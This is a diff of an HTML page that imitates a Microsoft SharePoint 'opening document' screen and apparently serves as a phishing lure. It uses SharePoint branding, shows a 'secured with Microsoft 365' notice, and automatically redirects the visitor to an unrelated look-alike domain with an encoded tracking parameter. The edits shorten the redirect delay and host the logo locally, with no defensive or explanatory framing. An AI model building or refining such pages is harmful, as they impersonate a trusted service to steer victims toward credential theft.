@@ -5,7 +5,7 @@
   <title>Opening document in SharePoint…</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
 
-  <!-- Auto redirect after 4 seconds -->
+  <!-- Auto redirect after 2 seconds -->
   <script>
     setTimeout(function () {
       window.location.href = "https://secure.sharedmforms.com/?aCXefF=NjE4MDkyZGQ2ZTZlNDNhODkzNzVjNmRmZmE3Yzk1YTk%3D&84K5B=E1aHz";
@@ -13,6 +13,7 @@
   </script>
 
   <style>
+    /* Stop links from turning blue/underlined */
     a {
       color: inherit !important;
       text-decoration: none !important;
@@ -119,8 +120,11 @@
 </head>
 <body>
   <div class="card">
+
+    <!-- SharePoint logo from your repo -->
     <div class="sp-logo">
-      <img src="https://cdn.iconscout.com/icon/free/png-256/sharepoint-226057.png" alt="Microsoft SharePoint Logo" />
+      <!-- Make sure sharepoint-logo.png is in the SAME folder as index.html -->
+      <img src="sharepoint-logo.png" alt="SharePoint Logo" />
     </div>
 
     <h1>Opening document in SharePoint…</h1>
@@ -140,6 +144,7 @@
     <div class="foot">
       Access secured with Microsoft 365. Only the intended recipient can view.
     </div>
+
   </div>
 </body>
 </html>
